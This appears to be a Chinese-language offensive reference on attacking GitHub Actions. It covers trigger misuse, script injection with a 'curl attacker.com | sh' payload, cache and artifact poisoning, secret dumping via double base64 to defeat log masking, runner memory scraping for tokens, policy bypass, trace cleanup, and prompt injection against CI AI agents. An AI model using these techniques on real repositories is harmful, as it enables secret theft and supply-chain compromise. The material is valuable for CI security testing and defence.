# GitHub Actions 专项攻击技术

本文档覆盖 GitHub Actions 平台的攻击技术细节，包括 Artifact/Cache Poisoning、Context Script Injection、GITHUB_TOKEN 滥用、OIDC Token 利用等。

## 1. 触发器安全模型

理解各触发器的权限边界是攻击 GitHub Actions 的基础。

### pull_request vs pull_request_target

这是最关键的安全区分：

| 特性 | `pull_request` | `pull_request_target` |
|---|---|---|
| 运行的代码版本 | PR 分支（攻击者控制） | 基础分支（仓库维护者控制） |
| GITHUB_TOKEN 权限 | 只读 | 读写 |
| Secrets 访问 | 无（fork PR 不注入 Secrets） | 有 |
| 首次贡献者 | 需维护者审批 | 自动运行 |
| 典型攻击方式 | 上传恶意 Artifact | 见下方"致命误用"模式 |

**`pull_request_target` 的致命误用模式：**

当 workflow 使用 `pull_request_target` 但显式 checkout PR 代码时，攻击者的代码在拥有完整 Secrets 的环境中执行：

```yaml
# 危险模式 - 攻击者代码在有 Secrets 的环境中运行
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # 检出了攻击者的代码
  - run: npm install  # 攻击者控制的 package.json 被执行
```

搜索此类漏洞的 GitHub Dork：`event.pull_request pull_request_target extension:yml`

### workflow_run 链式触发

`workflow_run` 在另一个 workflow 完成后触发，继承完整的 Secrets 和写权限。攻击链：

1. 低权限的 `pull_request` workflow 被外部 PR 触发
2. `workflow_run` 监听该 workflow 完成后触发
3. 如果 `workflow_run` 的 workflow 下载了 PR 的 Artifact 或使用了 PR 的 commit SHA → RCE

### issue_comment 触发器

`issue_comment` 以仓库级别凭据运行，不区分评论者身份。当 workflow 检查评论是否属于 PR 并 checkout `refs/pull/<id>/head` 时：

```yaml
on:
  issue_comment:
    types: [created]
jobs:
  run:
    if: github.event.issue.pull_request && contains(github.event.comment.body, '!deploy')
    steps:
      - uses: actions/checkout@v3
        with:
          ref: refs/pull/${{ github.event.issue.number }}/head  # 攻击者的 PR 代码
```

任何能在 PR 中输入触发关键词的人都可以在拥有写权限的 Runner 上执行代码。Rspack 安全事件即利用此模式：攻击者开 PR → 评论触发词 → workflow 执行 fork 的代码 → 窃取长期 PAT。

## 2. Context Script Injection

GitHub Actions 的表达式 `${{ ... }}` 在步骤执行前被渲染为纯文本并插入 shell 脚本。如果用户可控值被直接插入 `run:` 块，攻击者可注入任意 shell 命令。

### 核心原理

渲染发生在执行之前——shell 引号转义无法防御，因为注入发生在模板渲染阶段：

```yaml
# 漏洞模式
- run: echo "New issue ${{ github.event.issue.title }} created"
# 攻击者 issue 标题: $(curl https://attacker.com/sh | sh)
# 渲染后: echo "New issue $(curl https://attacker.com/sh | sh) created"
```

### 常见可注入上下文

| 上下文 | 触发事件 | 风险等级 |
|---|---|---|
| `github.event.issue.title` | issues | 高 |
| `github.event.issue.body` | issues | 高 |
| `github.event.pull_request.title` | pull_request / pull_request_target | 高 |
| `github.event.pull_request.body` | pull_request / pull_request_target | 高 |
| `github.event.pull_request.head.ref` | pull_request / pull_request_target | 高 |
| `github.event.comment.body` | issue_comment | 高 |
| `github.event.discussion.title` | discussion | 中 |
| `github.head_ref` | pull_request | 高 |

### 安全修复模式

将不可信输入通过 `env:` 映射传递，在 `run:` 中使用 shell 变量引用：

```yaml
# 安全模式
- name: Process issue
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "New issue $TITLE created"
```

注意：不要在 `run:` 中使用 `${{ env.TITLE }}`，这又会回到模板渲染注入的问题。

## 3. Artifact Poisoning

Artifact 是 GitHub Actions 中跨 workflow 传递数据的机制。攻击链利用低权限 workflow 上传恶意 Artifact，高权限 workflow 下载并执行。

### 攻击链

1. 攻击者通过 `pull_request` 触发低权限 workflow
2. 低权限 workflow 中上传恶意 Artifact（`actions/upload-artifact`）
3. 高权限的 `workflow_run` workflow 使用 `dawidd6/action-download-artifact` 下载 Artifact
4. 如果 Artifact 未指定 `path` 参数，文件被解压到当前目录，可覆盖脚本
5. 后续步骤执行被覆盖的脚本 → RCE

### 关键条件

- 高权限 workflow 必须下载并执行 Artifact 内容
- 如果使用 `dawidd6/action-download-artifact` 且未设置 `path`，文件直接解压到工作目录
- 被覆盖的文件（如 `script.py`）在后续步骤中被执行

## 4. Cache Poisoning

GitHub Actions 的缓存是仓库全局共享的，不按 workflow、事件类型或信任级别隔离。低权限作业可以污染高权限作业使用的缓存。

### 攻击原理

- 缓存条目仅通过 `key` 字符串标识，`restore-keys` 允许前缀匹配
- 任何能写缓存的作业（包括 `permissions: contents: read`）都可以覆盖缓存条目
- 缓存恢复为 zstd 压缩包直接解压，无完整性验证
- 如果缓存中包含脚本或二进制文件（如构建工具），攻击者控制执行路径

### 攻击步骤

1. 确定目标高权限 workflow 使用的缓存 key（通常是确定性的，如 `pip-${{ hashFiles('poetry.lock') }}`）
2. 通过低权限触发器（如 `pull_request_target`）写入同 key 的恶意缓存
3. 恶意缓存中包含被篡改的脚本/二进制文件
4. 高权限 workflow 恢复缓存并执行篡改内容 → 获得 Secrets 访问权

### 高级技术（2025-2026）

- **Cache v2 前缀命中**：精确 key 未命中时回退到前缀匹配，攻击者可预置近似碰撞的 key
- **强制淘汰**：GitHub 超过 10GB 限制时立即淘汰。攻击者先上传垃圾填满配额，触发合法缓存淘汰，再写入恶意缓存
- **缓存穿透到 Bot PAT 窃取**：缓存投毒暴露 Bot PAT → force-push Bot 拥有的 PR head → 在合并前替换为恶意 commit

### 防御建议

- 按信任边界使用不同缓存 key 前缀（`untrusted-` vs `release-`）
- 禁止在处理不可信输入的 workflow 中写缓存
- 执行前验证缓存内容的完整性（哈希校验）

## 5. GITHUB_TOKEN 利用

当攻击者在 Actions Runner 中获得代码执行权后，`GITHUB_TOKEN` 提供以下能力：

- **合并 PR**：`PUT /repos/{owner}/{repo}/pulls/{pr}/merge`
- **审批 PR**：`POST /repos/{owner}/{repo}/pulls/{pr}/reviews` with `{"event":"APPROVE"}`——可用于绕过需要审批的分支保护
- **创建 PR**：自动创建包含恶意代码的 PR
- **推送代码**：如果 token 有 `contents: write` 权限

**日志中检查 Token 权限：** Actions 执行日志中会显示 GITHUB_TOKEN 被授予的权限范围。

**Secrets 双重 base64 绕过掩码：**

```yaml
- run: echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

本地解码：`echo "ZXdv...Zz09" | base64 -d | base64 -d`

## 6. OIDC Token 滥用（GitHub → Cloud）

GitHub Actions 支持 OIDC 联合身份，workflow 可以请求 OIDC JWT Token 并用它在 AWS/GCP/Azure 中换取临时凭据。

### 攻击条件

- Workflow 声明了 `permissions: id-token: write`
- 云端配置了信任 GitHub OIDC Provider 的 IAM Role/Service Account
- 信任策略过于宽松（例如只验证组织名但不验证仓库或分支）

### 利用流程

1. 在 Runner 中请求 OIDC Token
2. 使用 Token 调用 `sts:AssumeRoleWithWebIdentity`（AWS）或对应的 GCP/Azure 接口
3. 获取临时云凭据 → 参考 `aws-pentesting` / `gcp-pentesting` 技能进行后续利用

### Terraform Cloud OIDC

Terraform Cloud Runner 工作目录中的凭据文件：
- GCP：`tfc-google-application-credentials`（WIF JSON）+ `tfc-gcp-token`（短期访问 Token）
- AWS：`tfc-aws-shared-config`（OIDC Role Assumption）+ `tfc-aws-token`

## 7. 已删除数据的恢复

GitHub 上被删除的数据可能仍然可访问：

- **已删除的 Fork**：fork 中的 commit 数据在 fork 删除后仍可通过原始仓库的 commit hash 访问
- **已删除的仓库**：如果存在 fork，原仓库删除后所有变更仍可通过 fork 访问
- **Private 仓库数据**：private 仓库变为 public 之前的内部 fork 数据可能被访问

访问方式：`https://github.com/<user>/<repo>/commit/<commit_hash>`，短 SHA-1（7 字符）可暴力枚举。

## 8. Action 供应链攻击

### Mutable Tag 劫持

GitHub Actions 建议使用 `uses: owner/action@v1` 引用，但 `v1` 是可变标签。攻击者获取 Action 仓库写权限后：

1. Force-push `v1`、`v1.2.3` 等标签指向包含恶意代码的 commit
2. 所有下游 workflow 在下次运行时自动拉取恶意版本
3. 恶意代码在正常 Action 逻辑之前执行，窃取 Secrets 后继续正常流程（不影响输出）

**防御：** 使用完整 commit SHA 固定 Action 版本（`uses: owner/action@a1b2c3d4...`）

### Imposter Commits

GitHub 允许从 fork 向原始仓库提交 PR，即使 PR 未被接受，commit ID 仍在原始仓库中有效。攻击者可以伪造引用，使 workflow 使用看似来自可信仓库但实际由攻击者创建的 commit。

### Deleted Namespace 劫持

如果 Action 引用的仓库所有者更改了用户名（且仓库 star 数 < 100），攻击者可以注册同名用户并创建同名仓库来接管该 Action。

## 9. AI Agent Prompt Injection

CI/CD 中越来越多使用 LLM Agent（Gemini CLI、Claude Code Action、OpenAI Codex）。这些 Agent 在拥有 GITHUB_TOKEN 和 shell 执行能力的 Runner 中运行，同时消费不可信的仓库元数据。

### 攻击面

- Issue/PR 标题和正文被直接注入 prompt
- Agent 的工具调用（`run_shell_command`、`gh` CLI）继承作业环境
- 即使初始 prompt 安全，Agent 通过工具获取 issue/PR 内容时仍可被间接注入

### Claude Code Action TOCTOU

攻击者开 PR → 维护者评论触发 → 攻击者在 Agent 收集上下文前修改 PR 标题为恶意 payload → Agent 执行被注入的指令（如覆盖 Runner 上的 bun 二进制文件）→ 后续构建步骤执行攻击者代码。

## 10. Self-hosted Runner 利用

Self-hosted Runner 通常有更丰富的攻击面：

- **云元数据服务**：获取实例绑定的 IAM 角色凭据
- **Docker API 探测**：`curl http://127.0.0.1:2375/version` 检查暴露的 Docker API
- **Kubernetes 访问**：检查 `~/.kube/config` 或挂载的 ServiceAccount Token
- **内网横向移动**：Self-hosted Runner 通常在内网，可访问其他内部服务
- **Runner 进程内存**：`Runner.Listener` 进程包含所有步骤的 Secrets 明文

```bash
# Runner 进程内存转储
PID=$(pgrep -f 'Runner.Listener')
sudo gcore -o /tmp/runner "$PID"
strings "/tmp/runner.$PID" | grep -E 'gh[pousr]_|AKIA|ASIA|BEGIN .*PRIVATE KEY'
```

## 11. Actions 策略绕过

即使组织/仓库配置了 Actions 策略限制某些 Action 的使用，攻击者可以在 workflow 中先 `git clone` 该 Action 到本地目录，再以本地路径引用（`uses: ./tmp/action`）。策略不检查本地路径引用。

## 12. 痕迹清理

- GitHub 上的 PR 即使删除也会被 SIEM 记录
- 如果攻击者的 GitHub 账户被 GitHub 封禁，其所有 PR 会自动从公开界面移除
- 组织发现被攻击的唯一方式可能是通过 SIEM 中的 GitHub 审计日志
